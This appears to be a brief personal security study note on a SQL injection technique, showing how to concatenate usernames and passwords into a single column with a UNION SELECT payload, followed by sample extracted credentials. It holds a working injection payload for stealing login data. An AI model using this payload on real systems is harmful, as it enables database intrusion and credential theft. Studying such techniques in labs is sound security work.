---
tags:
  - security
---
Used in instances where you have less columns available to gather data than required.
Involves concatenating column data into one column.
```
' UNION SELECT username || '~' || password FROM users--
```
Will return a list like:
- `administrator~losu21`
- `weinger~peter`
- `carlos~montoya`